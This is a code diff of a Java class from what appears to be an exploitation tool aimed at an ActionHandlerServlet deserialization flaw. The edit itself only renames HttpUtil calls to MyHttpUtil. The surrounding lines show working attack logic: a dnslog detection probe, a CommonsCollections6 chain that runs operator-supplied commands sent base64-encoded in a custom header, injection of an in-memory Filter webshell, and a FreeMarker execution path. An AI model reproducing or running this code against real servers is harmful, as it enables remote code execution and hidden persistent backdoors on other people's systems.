@@ -85,17 +85,17 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(urldns_conn);
+            MyHttpUtil.setTimeout(urldns_conn);
 
             // 设置请求头
             urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
             urldns_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
 
             // post 请求
-            HttpUtil.post(urldns_conn, compressData);
+            MyHttpUtil.post(urldns_conn, compressData);
 
             // 处理响应
-            int responseCode = HttpUtil.getResponseCode(urldns_conn);
+            int responseCode = MyHttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 logMessage("[+] ActionHandlerServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
             } else {
@@ -130,17 +130,17 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
             HttpURLConnection exp_cc6_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(exp_cc6_conn);
+            MyHttpUtil.setTimeout(exp_cc6_conn);
 
             // 设置请求头
             exp_cc6_conn.setRequestProperty("Content-Type", "application/octet-stream");
             exp_cc6_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
 
             // post 请求
-            HttpUtil.post(exp_cc6_conn, compressData);
+            MyHttpUtil.post(exp_cc6_conn, compressData);
 
             // 处理响应
-            int responseCode = HttpUtil.getResponseCode(exp_cc6_conn);
+            int responseCode = MyHttpUtil.getResponseCode(exp_cc6_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                 exp_cc6_conn.disconnect();
@@ -181,7 +181,7 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
             HttpURLConnection exec_cc6_poc_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(exec_cc6_poc_conn);
+            MyHttpUtil.setTimeout(exec_cc6_poc_conn);
 
             // 设置请求头
             exec_cc6_poc_conn.setRequestProperty("Content-Type", "application/octet-stream");
@@ -189,24 +189,24 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
             exec_cc6_poc_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64("echo yyds".getBytes()));
 
             // post 请求
-            HttpUtil.post(exec_cc6_poc_conn, compressData);
+            MyHttpUtil.post(exec_cc6_poc_conn, compressData);
 
-            int cc6PocResponseCode = HttpUtil.getResponseCode(exec_cc6_poc_conn);
-            String cc6PocResponseText = HttpUtil.getResponseText(exec_cc6_poc_conn);
+            int cc6PocResponseCode = MyHttpUtil.getResponseCode(exec_cc6_poc_conn);
+            String cc6PocResponseText = MyHttpUtil.getResponseText(exec_cc6_poc_conn);
             if (cc6PocResponseCode == HttpURLConnection.HTTP_OK && cc6PocResponseText.contains(flag)) {
                 // 创建新连接
                 HttpURLConnection exec_cc6_exp_conn = (HttpURLConnection) apiUrl.openConnection();
 
                 // 设置超时
-                HttpUtil.setTimeout(exec_cc6_exp_conn);
+                MyHttpUtil.setTimeout(exec_cc6_exp_conn);
 
                 exec_cc6_exp_conn.setRequestProperty("Content-Type", "application/octet-stream");
                 exec_cc6_exp_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
                 exec_cc6_exp_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64(Config.CMD.getBytes()));
-                HttpUtil.post(exec_cc6_exp_conn, compressData);
+                MyHttpUtil.post(exec_cc6_exp_conn, compressData);
 
-                int cc6ExpResponseCode = HttpUtil.getResponseCode(exec_cc6_exp_conn);
-                String cc6ExpResponseText = HttpUtil.getResponseText(exec_cc6_exp_conn);
+                int cc6ExpResponseCode = MyHttpUtil.getResponseCode(exec_cc6_exp_conn);
+                String cc6ExpResponseText = MyHttpUtil.getResponseText(exec_cc6_exp_conn);
 
                 if (cc6ExpResponseCode == HttpURLConnection.HTTP_OK && cc6ExpResponseText.length() != 0) {
                     logExec("[+] CommonsCollections6 执行成功!\n" + cc6ExpResponseText);
@@ -252,16 +252,16 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
             HttpURLConnection exec_freemarker_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(exec_freemarker_conn);
+            MyHttpUtil.setTimeout(exec_freemarker_conn);
 
             // 设置请求头
             exec_freemarker_conn.setRequestProperty("Content-Type", "application/octet-stream");
             exec_freemarker_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
 
-            HttpUtil.post(exec_freemarker_conn, compressData);
+            MyHttpUtil.post(exec_freemarker_conn, compressData);
 
-            int freemarkerExpResponseCode = HttpUtil.getResponseCode(exec_freemarker_conn);
-            String freemarkerExpResponseText = HttpUtil.getResponseText(exec_freemarker_conn);
+            int freemarkerExpResponseCode = MyHttpUtil.getResponseCode(exec_freemarker_conn);
+            String freemarkerExpResponseText = MyHttpUtil.getResponseText(exec_freemarker_conn);
 
 
             // 处理响应
